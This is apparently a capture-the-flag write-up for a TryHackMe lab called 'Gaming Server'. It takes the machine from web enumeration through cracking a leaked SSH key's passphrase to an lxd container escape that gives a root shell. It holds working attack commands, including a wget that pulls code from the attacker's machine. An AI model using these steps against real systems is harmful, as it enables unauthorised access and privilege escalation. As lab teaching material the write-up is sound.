---
layout: post
permalink: /posts/thm/gaming-server
title: "Gaming Server"
---

Let's start our enumeration process with nmap.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/gaming-server/nmap.png)

There are open ports 22 ssh and 80 http. Before visit the web server run a scan for hidden directories.

```
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

While we are waiting the scan go and visit the web server.

![website](/assets/images/thm/gaming-server/website.png)

Nothing interesting here, let's look the source code.

![source-code](/assets/images/thm/gaming-server/source-code.png)

At the end of the source code we have found a message for john. This could be a username. Our web scan has finished.

![gobuster](/assets/images/thm/gaming-server/gobuster.png)

There are two interesting directories `secret` and `uploads`. Let's check them.

![secret](/assets/images/thm/gaming-server/secret.png)

Open this key.

![secret-key](/assets/images/thm/gaming-server/secret-key.png)

Probably we'll be able to SSH with this key and the username we had found earlier. Copy the whole context of the key and create a file, `id_rsa` for example and also change the mode.

```
chmod 600 id_rsa
```

Now try to ssh.

```
ssh -i id_rsa john@<IP>
```

![ssh1](/assets/images/thm/gaming-server/ssh1.png)

Hmm... we need a passphrase. Let's visit the uploads directory.

![uploads](/assets/images/thm/gaming-server/uploads.png)

There are some files.

![meme](/assets/images/thm/gaming-server/meme.png)

![manifesto](/assets/images/thm/gaming-server/manifesto.png)

![dict](/assets/images/thm/gaming-server/dict.png)

One of the file looks like passwords list. Let's try to crack the id_rsa passphrase. We can first use `ssh2john` for that purpose.

```
/opt/john/ssh2john.py id_rsa > hash
```

Now we have the hash, let's crack it.

```
john --wordlist=dict hash
```

![john](/assets/images/thm/gaming-server/john.png)

Here we go. Try to ssh again.

```
ssh -i id_rsa john@<IP>
```

![ssh2](/assets/images/thm/gaming-server/ssh2.png)

From here we can reveal the first flag. We now need to escalate our privileges. Let's review if we can execute any commands as root.

```
sudo -l
```

![sudo-l](/assets/images/thm/gaming-server/sudo-l.png)

Unfortunately the password is not the same as the passphrase for the ssh key. We can use `leanpeas` to automate our possible privileges. On your attacking machine start a python server where the linpeas is located.

```
python3 -m http.server
```

On the target machine navigate to `/tmp` folder and download the script.

![wget](/assets/images/thm/gaming-server/wget.png)

Give execution permission to the script.

```
chmod +x linpeas.sh
```

and run it

```
./linpeas.sh
```

![linpeas](/assets/images/thm/gaming-server/linpeas.png)

Based on the linpeas legend if something is highlighted with red/yellow this probably will be our privilege escalation vector. Our user is in `lxd` group. I have googled `lxd exploit` and I have found this article <https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation>.

![hacktricks](/assets/images/thm/gaming-server/hacktricks.png)

Good news for us! I have followed the steps but for some reason I wasn't able to install `distrobuilder`. Going back to the google result I have found another article <https://www.hackingarticles.in/lxd-privilege-escalation/> Following these steps I was able to escalate our privileges.

On your attacking machine execute the following commands.

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

Once the tar.gz file is created start python server again.

![builder](/assets/images/thm/gaming-server/builder.png)

On the target machine again from the tmp folder download the tar.gz file.

```
wget http://<YOUR-ATTACKING-MACHINE-IP>:8000/<TAR-FILE-NAME>.tar.gz
```

now we can add the image to LXD

```
lxc image import ./<TAR-FILE-NAME>.tar.gz --alias myimage
```

list the images

```
lxc image list
```

![lxc-ls](/assets/images/thm/gaming-server/lxc-ls.png)

Everything looks good, now use the following commands to escalate our privileges.

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

![esc](/assets/images/thm/gaming-server/esc.png)

Here we go, we have a root shell. Try to find the root flag.

```
find / -type f -name root.txt
```
